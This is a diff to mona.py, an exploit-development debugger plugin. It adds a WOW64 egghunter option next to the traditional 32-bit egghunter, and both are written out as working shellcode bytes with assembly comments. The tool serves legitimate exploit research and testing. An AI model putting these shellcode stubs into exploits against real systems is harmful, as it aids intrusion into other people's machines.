@@ -27,12 +27,12 @@ ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  
-$Revision: 508 $
-$Id: mona.py 508 2014-08-16 23:32:29Z corelanc0d3r $ 
+$Revision: 509 $
+$Id: mona.py 509 2014-08-18 20:51:58Z corelanc0d3r $ 
 """
 
 __VERSION__ = '2.0'
-__REV__ = filter(str.isdigit, '$Revision: 508 $')
+__REV__ = filter(str.isdigit, '$Revision: 509 $')
 __IMM__ = '1.8'
 __DEBUGGERAPP__ = ''
 arch = 32
@@ -12144,6 +12144,8 @@ def main(args):
 			filename = ""
 			egg = "w00t"
 			usechecksum = False
+			usewow64 = False
+			useboth = False
 			egg_size = 0
 			checksumbyte = ""
 			extratext = ""
@@ -12161,6 +12163,14 @@ def main(args):
 			if "t" in args:
 				if type(args["t"]).__name__.lower() != "bool":
 					egg = args["t"]
+
+			if "wow64" in args:
+				usewow64 = True
+
+
+			# placeholder for later
+			if "both" in args:
+				useboth = True
 
 			if len(egg) != 4:
 				egg = 'w00t'
@@ -12257,26 +12267,60 @@ def main(args):
 					
 			#let's start		
 			egghunter = ""
-			
-			#Basic version of egghunter
-			dbg.log("[+] Generating egghunter code")
-			egghunter += (
-				"\x66\x81\xca\xff\x0f"+	#or dx,0xfff
-				"\x42"+					#INC EDX
-				"\x52"					#push edx
-				"\x6a\x02"				#push 2	(NtAccessCheckAndAuditAlarm syscall)
-				"\x58"					#pop eax
-				"\xcd\x2e"				#int 0x2e 
-				"\x3c\x05"				#cmp al,5
-				"\x5a"					#pop edx
-				"\x74\xef"				#je "or dx,0xfff"
-				"\xb8"+egg+				#mov eax, egg
-				"\x8b\xfa"				#mov edi,edx
-				"\xaf"					#scasd
-				"\x75\xea"				#jne "inc edx"
-				"\xaf"					#scasd
-				"\x75\xe7"				#jne "inc edx"
-			)
+
+			if not usewow64:
+				#Basic version of egghunter
+				dbg.log("[+] Generating traditional 32bit egghunter code")
+				egghunter = ""
+				egghunter += (
+					"\x66\x81\xca\xff\x0f"+	#or dx,0xfff
+					"\x42"+					#INC EDX
+					"\x52"					#push edx
+					"\x6a\x02"				#push 2	(NtAccessCheckAndAuditAlarm syscall)
+					"\x58"					#pop eax
+					"\xcd\x2e"				#int 0x2e 
+					"\x3c\x05"				#cmp al,5
+					"\x5a"					#pop edx
+					"\x74\xef"				#je "or dx,0xfff"
+					"\xb8"+egg+				#mov eax, egg
+					"\x8b\xfa"				#mov edi,edx
+					"\xaf"					#scasd
+					"\x75\xea"				#jne "inc edx"
+					"\xaf"					#scasd
+					"\x75\xe7"				#jne "inc edx"
+				)
+
+			if usewow64:
+				egghunter = ""
+				egghunter += (
+					# 64 stub needed before loop
+					"\x31\xdb"                                      #xor ebx,ebx
+					"\x53"                                          #push ebx
+					"\x53"                                          #push ebx
+					"\x53"                                          #push ebx
+					"\x53"                                          #push ebx
+					"\xb3\xc0"                                      #mov bl,0xc0
+	
+					# 64 Loop
+					"\x66\x81\xCA\xFF\x0F"                          #OR DX,0FFF
+					"\x42"                                          #INC EDX
+					"\x52"                                          #PUSH EDX
+					"\x6A\x26"                                      #PUSH 26 
+					"\x58"                                          #POP EAX
+					"\x33\xC9"                                      #XOR ECX,ECX
+					"\x8B\xD4"                                      #MOV EDX,ESP
+					"\x64\xff\x13"                                  #CALL DWORD PTR FS:[ebx]
+					"\x5e"                                          #POP ESI
+					"\x5a"                                          #POP EDX
+					"\x3C\x05"                                      #CMP AL,5
+					"\x74\xe9"                                      #JE SHORT
+					"\xB8"+egg+                                     #MOV EAX,74303077 w00t
+					"\x8B\xFA"                                      #MOV EDI,EDX
+					"\xAF"                                          #SCAS DWORD PTR ES:[EDI]
+					"\x75\xe4"                                      #JNZ "inc edx"
+					"\xAF"                                          #SCAS DWORD PTR ES:[EDI]
+					"\x75\xe1"                                      #JNZ "inc edx"
+ 				)
 			
 			if usechecksum:
 				dbg.log("[+] Generating checksum routine")
@@ -16571,6 +16615,7 @@ Optional arguments :
     -c : enable checksum routine. Only works in conjunction with parameter -f
     -f <filename> : file containing the shellcode
     -startreg <reg> : start searching at the address pointed by this reg
+    -wow64 : generate wow64 egghunter. Default is traditional 32bit egghunter
 DEP Bypass options :
     -depmethod <method> : method can be "virtualprotect", "copy" or "copy_size"
     -depreg <reg> : sets the register that contains a pointer to the API function to bypass DEP. 
